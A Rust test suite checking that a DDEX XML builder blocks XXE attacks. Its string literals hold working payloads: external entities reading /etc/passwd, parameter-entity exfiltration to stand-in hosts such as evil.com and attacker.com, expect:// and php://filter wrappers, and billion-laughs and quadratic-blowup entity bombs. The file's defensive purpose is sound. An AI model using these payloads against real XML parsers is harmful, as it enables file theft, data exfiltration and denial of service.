//! Comprehensive XXE (XML External Entity) Attack Prevention Tests
//!
//! This module contains exhaustive tests for various XXE attack vectors
//! to ensure the DDEX builder correctly prevents XML External Entity attacks.
//!
//! Test Coverage:
//! - External DTD references
//! - Billion laughs (exponential entity expansion)
//! - Parameter entity expansion attacks
//! - Local file disclosure attempts
//! - Network request attempts
//! - Nested entity attacks
//! - Quadratic blowup attacks
//! - Mixed attack vectors

use ddex_builder::{
    builder::DDEXBuilder,
    error::BuildError,
    security::{InputValidator, SecurityConfig, SecureXmlReader},
};
use std::io::Cursor;

/// Test external DTD references that could lead to XXE
#[test]
fn test_external_dtd_prevention() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test 1: Basic external DTD reference
    let xxe_payload_1 = r#"<!DOCTYPE test [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>&xxe;</root>"#;

    let result = validator.validate_xml_content(xxe_payload_1);
    assert!(
        result.is_err(),
        "External DTD reference should be blocked: {:?}",
        result
    );

    // Test 2: External DTD with PUBLIC identifier
    let xxe_payload_2 = r#"<!DOCTYPE test [
        <!ENTITY xxe PUBLIC "public_id" "http://evil.com/evil.dtd">
    ]>
    <root>&xxe;</root>"#;

    let result = validator.validate_xml_content(xxe_payload_2);
    assert!(
        result.is_err(),
        "PUBLIC DTD reference should be blocked: {:?}",
        result
    );

    // Test 3: Parameter entity with external reference
    let xxe_payload_3 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?%file;'>">
        %eval;
        %exfil;
    ]>"#;

    let result = validator.validate_xml_content(xxe_payload_3);
    assert!(
        result.is_err(),
        "Parameter entity external reference should be blocked: {:?}",
        result
    );

    // Test 4: HTTP external entity
    let xxe_payload_4 = r#"<!DOCTYPE test [
        <!ENTITY xxe SYSTEM "http://evil.com/evil.xml">
    ]>
    <root>&xxe;</root>"#;

    let result = validator.validate_xml_content(xxe_payload_4);
    assert!(
        result.is_err(),
        "HTTP external reference should be blocked: {:?}",
        result
    );

    // Test 5: FTP external entity
    let xxe_payload_5 = r#"<!DOCTYPE test [
        <!ENTITY xxe SYSTEM "ftp://evil.com/evil.xml">
    ]>
    <root>&xxe;</root>"#;

    let result = validator.validate_xml_content(xxe_payload_5);
    assert!(
        result.is_err(),
        "FTP external reference should be blocked: {:?}",
        result
    );
}

/// Test billion laughs attack (exponential entity expansion)
#[test]
fn test_billion_laughs_prevention() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test 1: Classic billion laughs attack
    let billion_laughs = r#"<!DOCTYPE bomb [
        <!ENTITY a "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
        <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
        <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
        <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
        <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
        <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
        <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
        <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
        <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
        <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
    ]>
    <bomb>&j;</bomb>"#;

    let result = validator.validate_xml_content(billion_laughs);
    assert!(
        result.is_err(),
        "Billion laughs attack should be blocked: {:?}",
        result
    );

    // Test 2: Shorter exponential expansion
    let exponential_attack = r#"<!DOCTYPE bomb [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    ]>
    <bomb>&lol4;</bomb>"#;

    let result = validator.validate_xml_content(exponential_attack);
    assert!(
        result.is_err(),
        "Exponential entity attack should be blocked: {:?}",
        result
    );

    // Test 3: Quadratic blowup attack
    let quadratic_attack = r#"<!DOCTYPE bomb [
        <!ENTITY a "dos_attack_string_dos_attack_string_dos_attack_string">
    ]>
    <bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>"#;

    let result = validator.validate_xml_content(quadratic_attack);
    assert!(
        result.is_err(),
        "Quadratic blowup attack should be blocked: {:?}",
        result
    );
}

/// Test parameter entity expansion attacks
#[test]
fn test_parameter_entity_prevention() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test 1: Parameter entity with file disclosure
    let param_entity_attack_1 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(param_entity_attack_1);
    assert!(
        result.is_err(),
        "Parameter entity file disclosure should be blocked: {:?}",
        result
    );

    // Test 2: Parameter entity with network request
    let param_entity_attack_2 = r#"<!DOCTYPE test [
        <!ENTITY % remote SYSTEM "http://evil.com/evil.xml">
        %remote;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(param_entity_attack_2);
    assert!(
        result.is_err(),
        "Parameter entity network request should be blocked: {:?}",
        result
    );

    // Test 3: Nested parameter entities
    let nested_param_attack = r#"<!DOCTYPE test [
        <!ENTITY % sp SYSTEM "http://evil.com/sp.xml">
        <!ENTITY % param1 "<!ENTITY &#x25; param2 SYSTEM 'http://evil.com/param2.xml'>">
        %sp;
        %param1;
        %param2;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(nested_param_attack);
    assert!(
        result.is_err(),
        "Nested parameter entity attack should be blocked: {:?}",
        result
    );

    // Test 4: Parameter entity with data exfiltration attempt
    let exfil_attack = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "/etc/hosts">
        <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:443/collect?data=%file;'>">
        %eval;
        %send;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(exfil_attack);
    assert!(
        result.is_err(),
        "Data exfiltration attempt should be blocked: {:?}",
        result
    );
}

/// Test various local file disclosure attempts
#[test]
fn test_file_disclosure_prevention() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let file_disclosure_payloads = vec![
        // Standard file disclosure
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#,
        
        // Windows file disclosure
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><test>&xxe;</test>"#,
        
        // Expect header variant
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "expect://id">]><test>&xxe;</test>"#,
        
        // PHP wrapper
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><test>&xxe;</test>"#,
        
        // Jar protocol
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file">]><test>&xxe;</test>"#,
        
        // Netdoc protocol
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]><test>&xxe;</test>"#,
        
        // Gopher protocol
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "gopher://evil.com:70/1">]><test>&xxe;</test>"#,
    ];

    for (i, payload) in file_disclosure_payloads.iter().enumerate() {
        let result = validator.validate_xml_content(payload);
        assert!(
            result.is_err(),
            "File disclosure payload {} should be blocked: {:?}",
            i + 1,
            result
        );
    }
}

/// Test various network request attempts via XXE
#[test]
fn test_network_request_prevention() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let network_payloads = vec![
        // HTTP request
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><test>&xxe;</test>"#,
        
        // HTTPS request
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "https://evil.com/steal">]><test>&xxe;</test>"#,
        
        // FTP request
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "ftp://evil.com/file">]><test>&xxe;</test>"#,
        
        // FTPS request
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "ftps://evil.com/file">]><test>&xxe;</test>"#,
        
        // SFTP request
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "sftp://evil.com/file">]><test>&xxe;</test>"#,
        
        // LDAP request
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "ldap://evil.com/cn=test">]><test>&xxe;</test>"#,
        
        // Dict protocol (dictionary server)
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "dict://evil.com:2628/SHOW:SERVER">]><test>&xxe;</test>"#,
    ];

    for (i, payload) in network_payloads.iter().enumerate() {
        let result = validator.validate_xml_content(payload);
        assert!(
            result.is_err(),
            "Network request payload {} should be blocked: {:?}",
            i + 1,
            result
        );
    }
}

/// Test SecureXmlReader with malicious XML
#[test]
fn test_secure_xml_reader_xxe_protection() {
    let config = SecurityConfig::default();
    
    // Test external DTD blocking
    let malicious_xml = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    let cursor = Cursor::new(malicious_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config.clone());
    
    let mut buf = Vec::new();
    let result = reader.read_event(&mut buf);
    
    // Should fail when encountering DTD
    match result {
        Err(BuildError::Security(msg)) => {
            assert!(msg.contains("DTD processing not allowed") || msg.contains("Dangerous entity") || msg.contains("External reference"));
        }
        other => panic!("Expected security error for DTD, got: {:?}", other),
    }
    
    // Test billion laughs detection
    let billion_laughs = r#"<!DOCTYPE bomb [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    ]>
    <bomb>&lol2;</bomb>"#;
    
    let cursor = Cursor::new(billion_laughs.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config.clone());
    
    let mut buf = Vec::new();
    let result = reader.read_event(&mut buf);
    
    match result {
        Err(BuildError::Security(msg)) => {
            assert!(msg.contains("DTD processing not allowed") || msg.contains("XML bomb"));
        }
        other => panic!("Expected security error for XML bomb, got: {:?}", other),
    }
}

/// Test depth limit protection against deeply nested attacks
#[test]
fn test_depth_limit_protection() {
    let config = SecurityConfig {
        max_xml_depth: 5, // Very low limit for testing
        ..SecurityConfig::default()
    };
    
    // Create deeply nested XML that exceeds the limit
    let mut deeply_nested = String::from("<!DOCTYPE test [<!ENTITY deep ");
    for i in 0..10 {
        deeply_nested.push_str(&format!("<level{}>", i));
    }
    deeply_nested.push_str("content");
    for i in (0..10).rev() {
        deeply_nested.push_str(&format!("</level{}>", i));
    }
    deeply_nested.push_str(">]><root>&deep;</root>");
    
    let cursor = Cursor::new(deeply_nested.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);
    
    let mut buf = Vec::new();
    let mut events_processed = 0;
    
    loop {
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                events_processed += 1;
                buf.clear();
                if events_processed > 20 {
                    panic!("Too many events processed, depth limit not working");
                }
            }
            Err(BuildError::Security(msg)) => {
                assert!(msg.contains("nesting too deep") || msg.contains("DTD processing not allowed"));
                return; // Expected error
            }
            Err(e) => panic!("Unexpected error: {:?}", e),
        }
    }
}

/// Test element count limit protection
#[test]
fn test_element_count_limit_protection() {
    let config = SecurityConfig {
        max_child_elements: 5, // Very low limit for testing
        ..SecurityConfig::default()
    };
    
    // Create XML with many elements
    let many_elements = r#"<root>
        <child1>content</child1>
        <child2>content</child2>
        <child3>content</child3>
        <child4>content</child4>
        <child5>content</child5>
        <child6>content</child6>
        <child7>content</child7>
    </root>"#;
    
    let cursor = Cursor::new(many_elements.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);
    
    let mut buf = Vec::new();
    let mut error_found = false;
    
    loop {
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                buf.clear();
            }
            Err(BuildError::Security(msg)) => {
                assert!(msg.contains("Too many XML elements"));
                error_found = true;
                break;
            }
            Err(e) => panic!("Unexpected error: {:?}", e),
        }
    }
    
    assert!(error_found, "Expected element count limit to be enforced");
}

/// Test timeout protection against slow parsing attacks
#[test]
fn test_timeout_protection() {
    let config = SecurityConfig::default();
    
    // Create a very large XML that would take time to process
    let large_content = "x".repeat(1000000);
    let large_xml = format!("<root>{}</root>", large_content);
    
    let cursor = Cursor::new(large_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);
    
    let mut buf = Vec::new();
    
    // Process events rapidly - the timeout is set to 30 seconds in production
    // but for testing we rely on the fact that this should not timeout
    // under normal circumstances
    loop {
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                buf.clear();
            }
            Err(BuildError::Security(msg)) if msg.contains("timeout") => {
                // This would be expected for very slow parsing
                return;
            }
            Err(e) => panic!("Unexpected error: {:?}", e),
        }
    }
    
    // If we get here, the parsing completed normally, which is also acceptable
}

/// Test mixed attack vectors combining multiple XXE techniques
#[test]
fn test_mixed_attack_vectors() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);
    
    // Combination of external entity and parameter entity
    let mixed_attack_1 = r#"<!DOCTYPE test [
        <!ENTITY % remote SYSTEM "http://evil.com/remote.xml">
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        %remote;
    ]>
    <test>&xxe;</test>"#;
    
    let result = validator.validate_xml_content(mixed_attack_1);
    assert!(result.is_err(), "Mixed external/parameter entity attack should be blocked");
    
    // Combination of entity expansion and external reference
    let mixed_attack_2 = r#"<!DOCTYPE test [
        <!ENTITY external SYSTEM "http://evil.com/data">
        <!ENTITY expand "&external;&external;&external;&external;">
        <!ENTITY bomb "&expand;&expand;&expand;&expand;">
    ]>
    <test>&bomb;</test>"#;
    
    let result = validator.validate_xml_content(mixed_attack_2);
    assert!(result.is_err(), "Mixed expansion/external attack should be blocked");
    
    // Complex nested parameter entities with file disclosure
    let mixed_attack_3 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?%file;'>">
        <!ENTITY % nested "<!ENTITY &#x25; wrapper2 '%wrapper;'>">
        %nested;
        %wrapper2;
        %send;
    ]>
    <test>test</test>"#;
    
    let result = validator.validate_xml_content(mixed_attack_3);
    assert!(result.is_err(), "Complex nested parameter entity attack should be blocked");
}

/// Test edge cases and corner cases for XXE prevention
#[test]
fn test_xxe_edge_cases() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);
    
    // Test HTML entities (should be allowed in content)
    let html_entities = r#"<root>&lt;test&gt; &amp; &quot;quotes&quot;</root>"#;
    let result = validator.validate_xml_content(html_entities);
    assert!(result.is_ok(), "Standard HTML entities should be allowed");
    
    // Test numeric character references (should be allowed)
    let numeric_refs = r#"<root>&#65; &#x41; &#x20;</root>"#;
    let result = validator.validate_xml_content(numeric_refs);
    assert!(result.is_ok(), "Numeric character references should be allowed");
    
    // Test empty DTD (should still be blocked due to DTD processing being disabled)
    let empty_dtd = r#"<!DOCTYPE root []><root>content</root>"#;
    let result = validator.validate_xml_content(empty_dtd);
    assert!(result.is_err(), "Even empty DTD should be blocked when DTD processing is disabled");
    
    // Test entity reference without DTD (should be caught by entity validation)
    let entity_without_dtd = r#"<root>&unknown_entity;</root>"#;
    let result = validator.validate_xml_content(entity_without_dtd);
    assert!(result.is_err(), "Undefined entity reference should be blocked");
    
    // Test case variations of dangerous keywords
    let case_variations = vec![
        r#"<!DOCTYPE test [<!entity xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#,
        r#"<!DOCTYPE test [<!ENTITY xxe system "file:///etc/passwd">]><test>&xxe;</test>"#,
        r#"<!DOCTYPE test [<!Entity xxe System "file:///etc/passwd">]><test>&xxe;</test>"#,
    ];
    
    for payload in case_variations {
        let result = validator.validate_xml_content(payload);
        assert!(result.is_err(), "Case variation should still be blocked: {}", payload);
    }
}

/// Test that valid XML still works after security measures
#[test]
fn test_valid_xml_still_works() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config.clone());
    
    // Test basic valid XML
    let valid_xml = r#"<root><child>content</child></root>"#;
    let result = validator.validate_xml_content(valid_xml);
    assert!(result.is_ok(), "Valid XML should be accepted");
    
    // Test XML with attributes
    let xml_with_attrs = r#"<root id="123" name="test"><child attr="value">content</child></root>"#;
    let result = validator.validate_xml_content(xml_with_attrs);
    assert!(result.is_ok(), "Valid XML with attributes should be accepted");
    
    // Test XML with CDATA
    let xml_with_cdata = r#"<root><![CDATA[<script>alert('test')</script>]]></root>"#;
    let result = validator.validate_xml_content(xml_with_cdata);
    assert!(result.is_ok(), "Valid XML with CDATA should be accepted");
    
    // Test XML with processing instructions
    let xml_with_pi = r#"<?xml version="1.0" encoding="UTF-8"?><root>content</root>"#;
    let result = validator.validate_xml_content(xml_with_pi);
    assert!(result.is_ok(), "Valid XML with processing instruction should be accepted");
    
    // Test complex but valid XML structure
    let complex_valid_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
    <ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:MessageHeader>
            <ddex:MessageThreadId>MSG123</ddex:MessageThreadId>
            <ddex:MessageId>MSG456</ddex:MessageId>
            <ddex:MessageCreatedDateTime>2024-01-01T00:00:00Z</ddex:MessageCreatedDateTime>
        </ddex:MessageHeader>
        <ddex:UpdateIndicator>OriginalMessage</ddex:UpdateIndicator>
        <ddex:IsBackfill>false</ddex:IsBackfill>
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReleaseId>
                    <ddex:ISRC>TEST1234567890</ddex:ISRC>
                </ddex:ReleaseId>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>Test Release</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;
    
    let result = validator.validate_xml_content(complex_valid_xml);
    assert!(result.is_ok(), "Complex valid DDEX XML should be accepted: {:?}", result);
    
    // Test that SecureXmlReader can parse valid XML
    let cursor = Cursor::new(valid_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);
    
    let mut buf = Vec::new();
    let mut event_count = 0;
    
    loop {
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                event_count += 1;
                buf.clear();
            }
            Err(e) => panic!("Valid XML should not produce errors: {:?}", e),
        }
    }
    
    assert!(event_count > 0, "Should have processed some events for valid XML");
}

/// Integration test: Verify that DDEXBuilder rejects XXE attacks
#[test]
fn test_ddex_builder_xxe_protection() {
    let builder = DDEXBuilder::new();
    
    // Test that builder rejects malicious XML input if it processes XML directly
    // Note: This test may need to be adapted based on how DDEXBuilder handles input
    
    let xxe_json = r#"{
        "messageHeader": {
            "messageId": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
        }
    }"#;
    
    // The builder should sanitize input and reject dangerous content
    // This test assumes the builder validates string content for safety
    let result = builder.validate_json_input(xxe_json);
    
    // The specific error may vary based on implementation
    assert!(result.is_err(), "DDEXBuilder should reject input containing XXE attempts");
}